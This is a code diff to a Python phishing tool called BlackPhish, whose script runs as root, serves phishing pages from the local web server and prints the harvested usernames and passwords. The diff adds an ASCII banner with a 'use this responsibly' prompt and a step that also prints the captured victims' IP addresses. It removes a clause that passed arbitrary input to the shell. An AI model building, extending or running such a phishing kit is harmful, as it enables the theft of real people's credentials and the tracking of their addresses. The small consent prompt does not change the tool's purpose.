@@ -6,7 +6,7 @@
 
 # Please message us if you find any problems or ideas
 
-# version 1.1: - Added check local hosting
+# version 1.2: - Added warning message
 
 # Please update version number each time we update
 
@@ -17,14 +17,17 @@ try:
     from time import sleep
     from socket import create_connection, gethostname, gethostbyname
     from distutils.dir_util import copy_tree
+    import re
+    from urllib.request import urlopen
+    import json
 except ImportError:
     print("\033[31;1m" + "[!] Import Error, Aborting! \033[0m")
     exit(1)
 
 # Variables #
-cwd = getcwd()
-hostname = gethostname()
-localip = gethostbyname(hostname)
+cwd = getcwd() # Gets working directory
+hostname = gethostname() # Get hostname
+localip = gethostbyname(hostname) # Get local IP by hostname
 
 # COLORS #
 red = "\033[91;1m"
@@ -40,6 +43,53 @@ blink = "\033[5m"
 # Check for root #
 if geteuid() != 0:
     exit(red + "[!] Please run as root" + reset)
+    
+def warning():
+    print('''
+\033[91;1m
+                https://github.com/iinc0gnit0/BlackPhish \033[94;1m
+
+                             ░███░                                   ░█░   
+                           ░█████                                  ░███    
+                          ▒█████▓                                ░███░     
+                         ████████                               ████▓      
+                       ░█████████░                            ░█████       
+                     ░█████████████                          ░██████       
+          ░░▒███████████████████████████░░░                 ▓██████░       
+ ░░░░███████████████████████████████████████████▓░▒█░     ░███████░        
+█████████████████████████████████████████████████████████████████          
+ ░████████████████████████████████████████████████████████████████░        
+     ░░▓██████████████████████████████████████▓░░░██▓      ░░██████░       
+             ░░░░▒█████████████████████░████░                  ░█████░     
+                  ██████                 ░                                 
+                  ░█████                                                   
+                   ░████                                                   
+                    ░███                                                   
+                      ░█      
+                                                      \033[0m\033[91m
+        ▀█████████▄                      ▀████████▄
+          ███    ███                       ███    ███  
+          ███    ███                       ███    ███ 
+          ███▄▄▄██▀                        ███    ███ 
+          ███▀▀▀██▄                        ████████▀ 
+          ███    ██▄\033[31m  ┬  ┌─┐┌─┐┬┌─ \033[91m        ███ \033[31m ┬ ┬┬┌─┐┬ ┬ \033[91m
+          ███    ███\033[31m  │  ├─┤│  ├┴┐ \033[91m        ███\033[31m  ├─┤│└─┐├─┤\033[91m
+        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m
+        
+                
+                    Banner made by: \033[91;1m[ tuf_unkn0wn ]\033[94;1m
+                    
+                    Script created by: \033[91;1m[ inc0gnit0 ] [ retro0001 ]\033[94;1m
+                    
+                    Websites created by: \033[91;1m[ TableFlipGod ]\033[94;1m 
+                    
+                    Big Thanks to: \033[91;1m [ DarkSecDevelopers ]\033[93;1m ''')
+    print('\n')
+    warningchoice = input("                    Will you use this responsibly(\033[94;1my\033[93;1m/\033[91mn\033[93;1m?)")
+    if warningchoice == 'y':
+        print("")
+    else:
+        endMessage()
 
 def checkInternet():
     print(yellow + "[*] Checking connection...")
@@ -119,11 +169,14 @@ def endMessage():
 
 # Main Script #
 def main():
+    warning() 
+
     system("clear")
     
     checkInternet()
 
     system('clear') # clear #
+    
     banner() # Load Banner #
     choice = input(red + "        [BlackPhish] -> ") # Get user input #
 
@@ -198,13 +251,10 @@ def main():
                     print(green + "______________________________________________________________________________\n")
                     print('\n                CREDENTIALS FOUND\n\n')
                     system("cat /var/www/html/usernames.txt")
+                    print("\n")
+                    system("cat /var/www/html/ip.txt")
                     print("\n______________________________________________________________________________" + reset)
                     endMessage()
-
-    # Clear #
-    elif choice == "clear":
-        system('clear')
-        main()
 
     # Clean out everything #
     elif choice == "clean":
@@ -222,11 +272,6 @@ def main():
     # Exit #
     elif choice == 'exit':
         endMessage()
-    
-    # Use shell #
-    elif choice != "":
-        system(""+choice)
-        main()
 
     # Invalid Option Error #
     else:
